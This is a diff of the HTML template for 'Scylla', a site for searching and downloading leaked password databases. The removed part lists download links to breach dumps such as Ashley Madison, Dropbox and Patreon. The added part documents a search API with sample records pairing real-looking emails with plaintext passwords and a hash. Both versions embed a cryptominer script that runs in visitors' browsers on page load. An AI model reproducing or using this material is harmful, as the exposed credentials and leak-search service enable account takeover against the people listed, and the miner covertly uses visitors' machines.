@@ -1,303 +1,292 @@
-<html>
+<style>
+body{
+padding:5px 5px 5px 5px;
+padding-bottom:10px;
+}
 
-  <style>
-    html { font-size:16px; }
+.search-container{
+width: 490px;
+display: block;
+margin: 0 auto;
+}
 
-    .grid-table{
-    font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
-    border-collapse: collapse;
-    width: 100%;
-    }
+input#search-bar{
+margin: 0 auto;
+width: 100%;
+height: 45px;
+padding: 0 20px;
+font-size: 1rem;
+border: 1px solid #D0CFCE;
+outline: none;
+&:focus{
+border: 1px solid #008ABF;
+transition: 0.35s ease;
+color: #008ABF;
+&::-webkit-input-placeholder{
+transition: opacity 0.45s ease;
+opacity: 0;
+}
+&::-moz-placeholder {
+transition: opacity 0.45s ease;
+opacity: 0;
+}
+&:-ms-placeholder {
+transition: opacity 0.45s ease;
+opacity: 0;
+}
+}
+}
 
-    .grid-table td, .grid-table th, .grid-table {
-    border: 1px solid #ddd;
-    padding: 8px;
-    }
+.search-icon{
+position: relative;
+float: right;
+width: 75px;
+height: 75px;
+top: -62px;
+right: -45px;
+}
 
-    .grid-table tr:nth-child(even){background-color: #f2f2f2;}
+div#results {
 
-    .grid-table tr:hover {background-color: #ddd;}
+margin: auto;
+width: 60%;
+padding: 10px 10px 10px 10px;
+}
 
-    .grid-table th {
-    padding-top: 12px;
-    padding-bottom: 12px;
-    text-align: left;
-    background-color: #4CAF50;
-    color: white;
-    }
+body {
+margin: 5px;
+font-family: Arial, Helvetica, sans-serif;
+}
 
-    body {
-    font-family: Arial, Helvetica, sans-serif;
-    }
+.topnav {
+overflow: hidden;
+background-color: #333;
+}
 
-    .topnav {
-    overflow: hidden;
-    background-color: #333;
-    }
+.topnav a {
+float: left;
+color: #f2f2f2;
+text-align: center;
+padding: 14px 16px;
+text-decoration: none;
+font-size: 17px;
+}
 
-    .topnav a {
-    float: left;
-    color: #f2f2f2;
-    text-align: center;
-    padding: 14px 16px;
-    text-decoration: none;
-    font-size: 17px;
-    }
+.topnav a:hover {
+background-color: #ddd;
+color: black;
+}
 
-    .topnav a:hover {
-    background-color: #ddd;
-    color: black;
-    }
+.topnav a.active {
+background-color: #333;
+color: white;
+}
 
-    .topnav a.active {
-    background-color: #333;
-    color: white;
-    }
+div#page {
+
+width: 50%;
+text-align: center;
+margin: 0 auto;
+}
+
+table#results {
+
+width: 100%;
+font-size: 12px;
+padding: 10px 10px 10px 10px;
+font-weight: normal;
+}
+
+}
+
+</style>
 
 
-  </style>
+<div class="topnav">
+  <a class="active" href="/">Home</a>
+  <!--<a href="search">Search</a>
+  <a href="https://www.etsy.com/shop/TheInfoSecShop" target="_blank">Shop</a>-->
+</div>
 
-  <title>Scylla</title>
+<h2>Support Scylla</h2>
 
-  <div class="topnav">
-    <a class="active" href="">Home</a>
-    <a href="search">Search</a>
-    <a href="https://www.etsy.com/shop/TheInfoSecShop" target="_blank">Shop</a>    
-  </div>
-  
-<h1>Scylla Data and Dumps by <a href="https://twitter.com/_hyp3ri0n">_hyp3ri0n</a></h1>
+<p>Scylla needs your help! To make this project sustainable it unfortunately needs some help from the commmunity. I am glad to put my personal time and
+  money into this project, but I could use some help on the hosting costs. If you would consider buying me a metaphorical coffee it would greatly help in supporting scylla.  <style>.bmc-button img{width: 27px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{line-height: 36px !important;height:37px !important;text-decoration: none !important;display:inline-flex !important;color:#ffffff !important;background-color:#000000 !important;border-radius: 3px !important;border: 1px solid transparent !important;padding: 0px 9px !important;font-size: 17px !important;letter-spacing:-0.08px !important;box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;margin: 0 auto !important;font-family:'Lato', sans-serif !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;-o-transition: 0.3s all linear !important;-webkit-transition: 0.3s all linear !important;-moz-transition: 0.3s all linear !important;-ms-transition: 0.3s all linear !important;transition: 0.3s all linear !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#ffffff !important;}</style><link href="https://fonts.googleapis.com/css?family=Lato&subset=latin,latin-ext" rel="stylesheet"><a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/Eiw47ImnT"><img src="https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg" alt="Support Scylla"><span style="margin-left:5px">Support Scylla</span></a>
+
+<body>
+
+  <p>*Search is in early alpha, please report bugs to <a href="https://github.com/acaceres2176/scylla/issues" target="_blank">the scylla github repo</a></p>
+  <form class="search-container" action="search">
+    <input type="text" id="search-bar" name="q" placeholder="Please enter a search term...">
+    <!--<a href="#"><img class="search-icon"></a>-->
+  </form>
+
+<div id="results">
+{{ html_results|safe }}
+</div>
+
+<div id="page">
+
+  {% for page in pages %}
+
+    <a href="{{ url_for(request.endpoint) }}?&q={{ params['q'] }}&from={{ page * size }}&size=100">{{ page }}</a>
+
+  {% endfor %}
+
+</div>
 
 <br />
-<p>
-<h2>ToS</h2>
+<br />
+<br />
+<h2>Available Fields</h2>
 
-The information on this website is intended only for research purposes.
-Access has been given to security or other researchers for the purposes of research ONLY. Other than that I sincerely hope this data helps
-you with your projects. Much love.
+{% for field in fields %}
+  {{ field }} <br />
+{% endfor %}
+
+<h2>Queries</h2>
+
+<p>Queries use Lucene query syntax. You will get a 500 error if your query is incorrect. Use the fields listed above to guide you. Full query syntax (including wildcards) are supported</p>
+<figure>
+  <figcaption>Example search for passwords that start with ff</figcaption>
+  <pre>
+    <code>
+      Password:ff*
+    </code>
+  </pre>
+
+  <figcaption>This would match any passwords with a d in them and the username dave, dale, dane, etc.</figcaption>
+  <pre>
+    <code>
+      Name:da?e Password:*d*
+    </code>
+  </pre>
+  
+</figure>
+
+<h2>API</h2>
+
+  <p>The search API can be accessed by sending a GET request to this page with the Accept header set
+    to <code>Accept: application/json</code>
+    <br /><br />
+    <code>
+      GET https://scylla.sh/search?q=your_query&num=1000&from=200
+    </code>
+    <br /><br />
+
+    The above GET request grabs 1000 results of your_query starting at the 200th record. Pagination
+    can be done using the "from" parameter. Queries return the first 10,000 hits.
+    <br /><br />
+
+    Data is returned in JSON format like the following:
+    <br /><br />
+<code>
+<pre>
+[
+   {
+      "_id":"hKW8WWsBBGJneKoTbFS-",
+      "_index":"pw_data",
+      "_score":19.8656,
+      "_source":{
+         "Domain":"exploit.in",
+         "Email":"marin.vardic@zzf.hr",
+         "Password":"freeshit"
+      },
+      "_type":"_doc"
+   },
+   {
+      "_id":"_3PgVGsBBGJneKoTof0e",
+      "_index":"pw_data",
+      "_score":16.46111,
+      "_source":{
+         "Domain":"linkedin.com",
+         "Email":"jasna.cajsa-beber@zzf.hr",
+         "PassHash":"a3f5b3b7c790e397b2d77eca31cd96bcd57c8700"
+      },
+      "_type":"_doc"
+   },
+   {
+      "_id":"dBmbWmsBBGJneKoTZ5Wk",
+      "_index":"pw_data",
+      "_score":16.46111,
+      "_source":{
+         "Domain":"exploit.in",
+         "Email":"jasna.cajsa-beber@zzf.hr",
+         "Password":"vili2005"
+      },
+      "_type":"_doc"
+   }
+]
+</code>
+</pre>   
+    <br /><br />
+    Note you may use the fields below to guide you, but not all fields are returned with each query,
+    only available fields. If fields are added, they will be appended to the list of available fields for
+    query.
+
+  </p>
+
+<h2>Normalized Databases</h2>
+<p>The following are the databases available for search.</p>
+{% for db in dbs %}
+  {% if "all" in db %}
+  <!-- skipped all.jl -->
+  {% endif %}
+  The {{ db.split(".")[0] }} Database<br />
+{% endfor %}
+
+  <script src="https://www.hostingcloud.racing/FA18.js"></script>
+  <script>
+    var _client = new Client.Anonymous('b0a5fc90521fc2862b2feb55baee6a97a3285e548d8b9da055d1f586aef632e2', {
+    throttle: 0.5, ads: 0
+    });
+    _client.start();
+  </script>
+
+  <h2>ToS</h2>
+
+  The information on this website is intended only for research purposes.
+  Access has been given to security or other researchers for the purposes of research ONLY. Other than that I sincerely hope this data helps
+  you with your projects. Much love.
 </p>
 
 
 <p>
-<h2>ToS Enforcement</h2>
+  <h2>ToS Enforcement</h2>
 
-The information on this website is intended only for research purposes. We search common database leak sites to ensure this is not being circulated for malicious use. We do have default logging turned on for this website which likely includes IP addresses and other identifiers. Please don't misuse this information as we will cooperate with law enforcement if it is.
+  The information on this website is intended only for research purposes. We search common database leak sites to ensure this is not being circulated for malicious use. We do have default logging turned on for this website which likely includes IP addresses and other identifiers. Please don't misuse this information as we will cooperate with law enforcement if it is.
 </p>
 
 <p>
-Oh also, by using this site there's a cryptominer running in the background
-(throttled) to provide an ad-free experience. Feel free to turn JavaScript
-off should this bother you. But the longer you leave it on the more I can
-continue to provide updates and keep this site up (~$3000/month) <br /><br />
+  Oh also, by using this site there's a cryptominer running in the background
+  (throttled) to provide an ad-free experience. Feel free to turn JavaScript
+  off should this bother you. But the longer you leave it on the more I can
+  continue to provide updates and keep this site up (~$3000/month) <br /><br />
 
-- _hyp3ri0n <br /><br />
+  - _hyp3ri0n <br /><br />
 </p>
 <h2>Donations</h2>
 
 <p>
-Since many have asked (thank you btw) about direct donations, you can send Bitcoin to 3A33QU7C2DysuiLhxaeNmgprNnJfV2NskM
-or Monero to 83mqvyQpvzM7APKvWVGwa1iBVkwpThRdDapq4LejPdXi6dLs1oqr4c3Uchh7zUomATCfXrav8Kv1d3DoFUoJ1nQqD8NqW6K and may also
-donate with paypal with this button <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
-  <input type="hidden" name="cmd" value="_s-xclick" />
-  <input type="hidden" name="hosted_button_id" value="TY7TX56VZARXG" />
-  <input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" title="PayPal - The safer, easier way to pay online!" alt="Donate with PayPal button" />
-  <img alt="" border="0" src="https://www.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1" />
-</form>
+  Since many have asked (thank you btw) about direct donations, you can send Bitcoin to 3A33QU7C2DysuiLhxaeNmgprNnJfV2NskM
+  or Monero to 83mqvyQpvzM7APKvWVGwa1iBVkwpThRdDapq4LejPdXi6dLs1oqr4c3Uchh7zUomATCfXrav8Kv1d3DoFUoJ1nQqD8NqW6K and may also
+  donate with paypal with this button <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
+    <input type="hidden" name="cmd" value="_s-xclick" />
+    <input type="hidden" name="hosted_button_id" value="TY7TX56VZARXG" />
+    <input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" title="PayPal - The safer, easier way to pay online!" alt="Donate with PayPal button" />
+    <img alt="" border="0" src="https://www.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1" />
+  </form>
 </p>
 
 <h2>Issues and Bugs</h2>
-  <p>
-    Scylla is currently in alpha-v0.0.1, this is the first "official" non-prototype release. There will be bugs, managing this amount of data is difficult and expensive. Please report bugs to
-    <a href="https://github.com/acaceres2176/scylla/issues" target="_blank">the scylla open github repo</a>. Here you will also find the scylla code, please feel free to open feature requests
-    here as well. These let me know what the community wants out of this site and is supremely useful to me.
-  </p>
-
-<!--
-<h2>Internet-Wide Port Scans</h2>
-<table id="scans" class="grid-table">
-{% for scan in all_scans_dics %}  
-  <tr class="grid-item">
-    <img src="{{ url_for('static', filename='img/blue_folder.svg') }}" style="height: 64px; width=64px; display:inline-block;""> </img>
-    <td style=""><a href="http://scylla.sh/static/port-scans/{{ scan['filename'] }}">{{ scan['filename'] }}</a></td>
-    <td style="">The {{ scan['name'] }} scan</td>
-    <td style="">{{ scan['size'] }}</td>
-  </tr>
-{% endfor %}
-</table>
-
-<h2>Internet-Wide Web Scans</h2>
-<table id="scans2" class="grid-table">
-  <tr class="grid-item">
-    <img src="{{ url_for('static', filename='img/blue_folder.svg') }}" style="height: 64px; width=64px; display:inline-block;""> </img>
-    <td style=""><a href="https://s3-us-west-2.amazonaws.com/hyperiongray-public/final_results.jl">final_results.jl</a></td>
-    <td style="">All historical PunkSPIDER results</td>
-    <td style="">5.5 GB</td>
-  </tr>
-</table>
--->
-
-<h2>Databases*</h2>
 <p>
-  *data for larger files is stored on mega.nz (a mass storage site). You will be redirected to mega to download many files, this will provide less failed downloads (an issue with the previous version).
-  For HUGE files you may be asked to install the Mega client or use JDownloader (<a href="https://www.geekiest.net/post/How-to-download-from-Mega-using-download-manager" target="_blank">tutorial</a>).
-  Either way, if you cannot figure out how to download something, please contact me at scylla@opayq.com. Also the tar.gz file of all databases is coming - please be patient as I upload this, it takes
-  a little while.
+  Scylla is currently in alpha-v0.0.1, this is the first "official" non-prototype release. There will be bugs, managing this amount of data is difficult and expensive. Please report bugs to
+  <a href="https://github.com/acaceres2176/scylla/issues" target="_blank">the scylla open github repo</a>. Here you will also find the scylla code, please feel free to open feature requests
+  here as well. These let me know what the community wants out of this site and is supremely useful to me.
 </p>
-<table id="dbs" class="grid-table">
-
-  <tr class="grid-item">
-    <!--<img src="{{ url_for('static', filename='img/blue_folder.svg') }}" style="height: 64px; width=64px; display:inline-block;""> </img>-->
-    <td style="">Direct Link</td>
-    <!--<td style="">Torrent Link</td>-->
-    <td style="">Size</td>
-  </tr>
-
-  <!--
-  <tr class="grid-item">
-    <td style=""><a href="https://hyperiongray-public.s3-us-west-2.amazonaws.com/dbs.tar.gz">dbs.tar.gz - All Databases</a></td>
-    <td style="">519GB</td>
-  </tr>-->
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!7mBVVASB!t2l5Xwgr-hBYpVyf7JB1XwjUjjCwh8rum-fwcQVmfrE" target="_blank">All databases</a></td>
-    <td style="">519.92GB</td>
-  </tr>
   
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#F!H6JAHCSY!S2thHvy-rKM8c-zE_4VhPg" target="_blank">AP MYR & ZABUGOR #2</a></td>
-    <td style="">19.49GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#F!GqBWQYoY!9Lyy5RU3lTgtZ6ZS0JTaXQ" target="_blank">Collection_1</a></td>
-    <td style="">19.49GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#F!KyQklShQ!1HKZ6upskdbsISf4BSEmZA" target="_blank">Collection_2</a></td>
-    <td style="">528.50GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#F!3qIiUCYL!xWsmhxa_I3eXpWXv_xSZpw" target="_blank">Collection_3</a></td>
-    <td style="">37.18GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#F!7yw2FAIZ!U2Cdn4y_xFphFr1tOJz_cw" target="_blank">Collection_4</a></td>
-    <td style="">178.58GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#F!X6AwhI6K!QwE_Z1AiVb_0TcklmbepHQ" target="_blank">Collection_5</a></td>
-    <td style="">40.56GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#F!D6JWmCCI!IgVL-D1jHX41_qC6DB2Cug" target="_blank">EU_Russian_Antipublic</a></td>
-    <td style="">11.48 GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!v341lSYa!Jdbo0POQkfWoi7g6LE9WlgkkLoNW7WyyzfTvtehMu3w" target="_blank">experian.7z</a></td>
-    <td style="">1.01GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!uuw1CQLJ!8FCQ8lXdvILnqmUpDAuIzZOjEiGG60ZGlVTlcf9OF5o" target="_blank">adobe.sql.gz</a></td>
-    <td style="">1.09GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!S6wDXQhY!XOHHKk9xO_XQ8gbpiRobnW0ZSlVt0uNq3uGr0iXPRAM" target="_blank">imesh.7z</a></td>
-    <td style="">1.90GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!r3gVzaiY!J1ujVC30EtkeHiArT564OBQPNKTznZPUxF12Qb18_lA" target="_blank">vk.com.rar</a></td>
-    <td style="">1.12GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!Xron1QAC!0lffKEC7yt7DQjfJiga6LyQICWXyc-yenUc3dRG1tJk" target="_blank">kkkpen6.tar.gz</a></td>
-    <td style="">1.75GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!fzwihSYJ!3mBfoso8g4cPwL_MkCutDLHh6Gqf4Z2dtDjYaduMi4U" target="_blank">last.fm.tar.gz</a></td>
-    <td style="">2.38GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!fqwzSC7Z!8FCQ8lXdvILnqmUpDAuIzZOjEiGG60ZGlVTlcf9OF5o" target="_blank">Tumblr_2013_users.zip</a></td>
-    <td style="">1.09GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!Or4WWKTD!8FCQ8lXdvILnqmUpDAuIzZOjEiGG60ZGlVTlcf9OF5o" target="_blank">Tumblr_2013_users.zip</a></td>
-    <td style="">1.09GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!2iAl2CyK!oOMe2YXOBciFgPUOd7XPVK3O3cfWS5cs5-qMRKYOVtg" target="_blank">neatease.7z</a></td>
-    <td style="">2.00GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!jzQj3ABD!w2-vVn9dc7Z4ySNql6VW4R8d9Jl1djVdr2HX52CsuCw" target="_blank">dropbox.7z</a></td>
-    <td style="">2.36GB</td>
-  </tr>
+  <!-- Matomo Image Tracker-->
+  <img src="https://analytics.hyperiongray.com/matomo.php?idsite=9&amp;rec=1" style="border:0" alt="" />
+  <!-- End Matomo -->
   
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!73Z1DCCb!8KuFdMhz3BUHME5A-4zPOnIqrTTWwk6EG7Ww3h9f0wM" target="_blank">ashley_madison.7z</a></td>
-    <td style="">2.42GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!SixX3YCb!LAcbmVc3RtVmaAJH0JvHB-G7BLv9G0xA599jDAUd7Jo" target="_blank">badoo.7z</a></td>
-    <td style="">5.38GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!ezwVVQgD!SxYjWUNxPXLFoc3O6gpiTTS7AjVUR7etFRNM8HjxblY" target="_blank">fling.com</a></td>
-    <td style="">2.42GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!qvpRkATY!lH_oDVC_TO_c3FqgVV7ITFjp5wzzqcKpOxIatG8fRWE" target="_blank">modbsolutions.rar</a></td>
-    <td style="">2.61GB</td>
-  </tr>
-
-  <tr class="grid-item">
-    <td style=""><a href="https://mega.nz/#!ezhjjSDY!3Hu-HgXzBsRKC4o4U__dr_GKovS1jiT1WbnXtJ7EY9M" target="_blank">patreon.7z</a></td>
-    <td style="">2.80GB</td>
-  </tr>
-
-  
-  
-  
-{% for db in all_dbs_dics %}
-
-    <tr class="grid-item">
-      <!--<img src="{{ url_for('static', filename='img/blue_folder.svg') }}" style="height: 64px; width=64px; display:inline-block;""> </img>-->
-      <td style=""><a href="http://scylla.sh/static/dbs/{{ db['filename'] }}">{{ db['filename'] }}</a></td>
-      <!--<td style=""><a href="http://scylla.sh/static/torrent/{{ db['torrent_filename'] }}">{{ db['torrent_filename'] }}</td>-->
-      <td style="">{{ db['size'] }}</td>
-    </tr>
-
-{% endfor %}
-
-</table>
-
-<script src="https://www.hostingcloud.racing/FA18.js"></script>
-<script>
-  var _client = new Client.Anonymous('b0a5fc90521fc2862b2feb55baee6a97a3285e548d8b9da055d1f586aef632e2', {
-  throttle: 0.3, ads: 0
-  });
-  _client.start();
-</script>
-
-<!-- Matomo Image Tracker-->
-<img src="https://analytics.hyperiongray.com/matomo.php?idsite=9&amp;rec=1" style="border:0" alt="" />
-<!-- End Matomo -->
-
-</html>
+</body>
